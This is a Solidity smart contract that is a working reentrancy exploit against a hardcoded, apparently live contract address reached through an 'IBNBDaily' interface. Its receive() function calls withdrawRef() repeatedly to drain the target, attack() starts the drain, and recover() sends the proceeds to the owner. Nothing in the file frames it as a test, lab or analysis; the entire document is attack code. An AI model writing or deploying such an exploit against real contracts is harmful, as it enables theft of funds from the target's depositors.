// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBNBDaily {
    function withdrawRef() external;
    function invest(address) external payable;
}

contract Nicehehe {
    address public vulnerable;
    address public owner;

    constructor() {
        vulnerable = address(0xbecFD0BB03B34D973c0eE577d20A7F363A0E2094);
        owner = msg.sender;
    }

    // Fallback function that gets called when no other function matches the called function
    receive() external payable {
        if (address(this).balance < 5000000000000000*10 && msg.sender == vulnerable){
            IBNBDaily(vulnerable).withdrawRef();
        }
    }

    // The initial attack is launched from this function
    function attack() public {
        require(msg.sender == owner, "Not the owner");
        IBNBDaily(vulnerable).withdrawRef();
    }

    // The initial attack is launched from this function
    function deposit() public {
        require(msg.sender == owner, "Not the owner");
        IBNBDaily(vulnerable).invest{value: address(this).balance - 5000000000000000}(address(0x08c74bEF4E534BD1726532015BF9c0f4832f4c94));
    }

    // Any remaining Ether is recovered to the owner's address
    function recover() public {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance - 5000000000000000);
    }
}